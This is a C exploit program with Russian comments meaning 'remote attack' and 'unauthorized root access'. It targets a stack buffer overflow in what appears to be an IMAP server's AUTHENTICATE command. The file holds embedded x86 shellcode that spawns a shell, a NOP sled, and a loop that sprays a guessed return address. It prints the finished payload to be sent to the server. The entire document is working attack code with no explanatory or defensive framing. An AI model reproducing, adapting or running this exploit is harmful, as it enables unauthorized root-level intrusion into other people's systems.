/* Удаленное нападение (Linux) */
// Неавторизованный доступ с корневыми привилегиями.
#include <stdio.h>  
#include <stdlib.h>
#include <limits.h>
#include <string.h>

#define BUFLEN 2048
#define NOP 0x90

char shell[] =
    "\xeb\x38\x5e\x89\xf3\x80\xd8\x80"
    "\x46\x01\x20\x80\x46\x02\x20\x80"
    "\x46\x03\x20\x80\x46\x05\x20\x80"
    "\x46\x06\x20\x89\xf7\x83\xc7\x07"
    "\x31\xc0\xaa\x89\xf9\x89\xf0\xab"
    "\x89\xfa\x31\xc0\xab\xb0\x08\x04"
    "\x03\xcd\x80\x31\xdb\x89\xd8\x40"
    "\xcd\x80\xe8\xc3\xff\xff\xff\x2f"
    "\x42\x49\x4e\x2f\x53\x48\x00";

void main(int argc, char *argv[])
{
    char buf[BUFLEN];
    int offset=0,nop,i;
    unsigned long esp;

    fprintf(stderr, "usage: %s <offset>\n", argv[0]);

    nop = 403;
    esp = 0xbffff520;
    if(argc>1)
	offset = atoi(argv[1]);

    memset(buf, NOP, BUFLEN);
    memcpy(buf+(long)nop, shell, strlen(shell));

    for(i = 512; i < BUFLEN - 4; i += 4)
	*((int *) &buf[i]) = esp + (long) offset;

    printf("* AUTHENTICATE {%d}\r\n", BUFLEN);
    for(i = 0; i < BUFLEN; i++)
	putchar(buf[i]);

    printf("\r\n");

    return 0;
}
